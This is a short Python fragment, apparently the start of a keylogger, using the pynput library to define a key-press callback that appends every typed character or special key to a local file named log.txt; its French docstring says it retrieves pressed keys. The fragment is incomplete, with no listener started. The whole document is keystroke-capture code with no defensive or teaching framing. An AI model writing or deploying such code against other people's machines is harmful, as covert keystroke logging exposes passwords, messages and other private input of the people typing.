from pynput import *

def on_press(key):
    """recupere les touches presses"""

    try:
        with open("log.txt","a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open("log.txt","a") as f:
            f.write(f"{key}")

